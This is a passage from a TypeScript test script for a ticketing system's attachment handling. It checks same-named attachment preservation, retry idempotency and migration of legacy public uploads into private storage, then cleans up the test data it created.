        check("CASE O: the FIRST attachment's exact original bytes are preserved", matchesA);
        check("CASE O: the SECOND attachment's exact original bytes are preserved (not overwritten by the first)", matchesB);
        check("CASE O: the two attachments are not byte-identical to each other (proves neither was silently deduped/overwritten)", !bytesOnDiskA.equals(bytesOnDiskB));
      }

      // ── CASE P — retry does not duplicate either same-named attachment ──
      console.log("\nCASE P — retry does not duplicate either of the two same-named attachments...\n");
      const retry = await acceptPendingTicket(pendingId, acceptingUser.id);
      check("CASE P: retry returns already_accepted", !retry.ok && retry.error === "already_accepted");
      if (caseOTicketId) {
        const rowsAfterRetry = await prisma.ticketAttachment.findMany({ where: { ticketId: caseOTicketId } });
        check("CASE P: still exactly two TicketAttachment rows after retry (neither duplicated)", rowsAfterRetry.length === 2);
      }
    }

    // ── CASE Q — legacy attachment compatibility / migration script ───────
    console.log("\nCASE Q — legacy attachment (written under the OLD public/uploads location) is carried forward by the migration script...\n");
    {
      const legacyBytes = Buffer.from("legacy attachment bytes, pre-dating private storage");
      const ticket = await prisma.ticket.create({
        data: {
          title: "Legacy attachment compatibility proof",
          description: "plain text",
          source: "WEB",
          requesterId: acceptingUser.id,
          departmentId: dept.id,
          statusId: (await prisma.ticketStatus.findFirstOrThrow({ where: { departmentId: dept.id } })).id,
        },
      });
      legacyMigrationTicketId = ticket.id;
      ticketIds.push(ticket.id);

      const legacyFilename = "legacy-report.pdf";
      const legacyDir = path.join(LEGACY_PUBLIC_UPLOAD_DIR, ticket.id);
      await fs.mkdir(legacyDir, { recursive: true });
      await fs.writeFile(path.join(legacyDir, legacyFilename), legacyBytes);
      await prisma.ticketAttachment.create({
        data: {
          ticketId: ticket.id,
          uploadedById: acceptingUser.id,
          filename: legacyFilename,
          originalName: "report.pdf",
          mimeType: "application/pdf",
          size: legacyBytes.length,
          path: `/uploads/${ticket.id}/${legacyFilename}`,
        },
      });

      const dryRunStats = await runMigration(prisma, { apply: false });
      check("CASE Q: dry run identifies the legacy attachment as needing migration", dryRunStats.toCopy >= 1);
      const notYetPrivate = await fs.access(path.join(UPLOAD_DIR, ticket.id, legacyFilename)).then(() => true, () => false);
      check("CASE Q: dry run wrote nothing to the private location", !notYetPrivate);

      const applyStats = await runMigration(prisma, { apply: true });
      check("CASE Q: apply run copies at least the legacy attachment", applyStats.copied >= 1 && applyStats.failed === 0);

      const nowPrivateBytes = await fs.readFile(path.join(UPLOAD_DIR, ticket.id, legacyFilename)).catch(() => null);
      check("CASE Q: legacy attachment now readable from the private location", !!nowPrivateBytes && nowPrivateBytes.equals(legacyBytes));
      const sourceStillThere = await fs.readFile(path.join(LEGACY_PUBLIC_UPLOAD_DIR, ticket.id, legacyFilename)).catch(() => null);
      check("CASE Q: legacy source file was never deleted/modified (copy, not move)", !!sourceStillThere && sourceStillThere.equals(legacyBytes));

      const rerunStats = await runMigration(prisma, { apply: true });
      check("CASE Q: re-running apply is idempotent — reports already-private, copies nothing new for this row", rerunStats.alreadyPrivate >= 1 && rerunStats.copied === 0);
    }
  } finally {
    console.log("\nCleaning up test data...\n");
    const uploadDirsToRemove = [
      ...pendingTicketIds.map((id) => path.join(UPLOAD_DIR, "pending", id)),
      ...ticketIds.map((id) => path.join(UPLOAD_DIR, id)),
    ];
    // CASE Q also deliberately wrote a file under the LEGACY public
    // location (simulating a pre-existing attachment) — clean that up too,
    // separately from the private UPLOAD_DIR paths above.
    if (legacyMigrationTicketId) uploadDirsToRemove.push(path.join(LEGACY_PUBLIC_UPLOAD_DIR, legacyMigrationTicketId));
    for (const dir of uploadDirsToRemove) {
      await fs.rm(dir, { recursive: true, force: true }).catch(() => {});
    }
    const cleanupSteps: Array<[string, () => Promise<unknown>]> = [
      ["ticketAttachments", () => prisma.ticketAttachment.deleteMany({ where: { ticketId: { in: ticketIds } } })],
      ["ticketMessages", () => prisma.ticketMessage.deleteMany({ where: { ticketId: { in: ticketIds } } })],
      ["ticketHistory", () => prisma.ticketHistory.deleteMany({ where: { ticketId: { in: ticketIds } } })],
      ["tickets", () => prisma.ticket.deleteMany({ where: { id: { in: ticketIds } } })],
      ["pendingTicketAttachments", () => prisma.pendingTicketAttachment.deleteMany({ where: { pendingTicketId: { in: pendingTicketIds } } })],
      ["pendingTickets", () => prisma.pendingTicket.deleteMany({ where: { id: { in: pendingTicketIds } } })],
      ["departmentMemberships", () => prisma.departmentMembership.deleteMany({ where: { userId: { in: userIds } } })],
      ["users", () => prisma.user.deleteMany({ where: { id: { in: userIds } } })],
      ["ticketStatuses", () => (dept ? prisma.ticketStatus.deleteMany({ where: { departmentId: dept.id } }) : Promise.resolve())],
      ["ticketPriorities", () => (dept ? prisma.ticketPriority.deleteMany({ where: { departmentId: dept.id } }) : Promise.resolve())],
      ["departments", () => prisma.department.deleteMany({ where: { id: { in: [dept, otherDept].filter((d): d is { id: string } => !!d).map((d) => d.id) } } })],
    ];
    for (const [label, step] of cleanupSteps) {
      try {
        await step();
      } catch (err) {
        console.warn(`Cleanup step "${label}" failed (non-fatal):`, err instanceof Error ? err.message : err);
      }
    }
    await prisma.$disconnect();
  }

  printSummaryAndExit();
}

main();
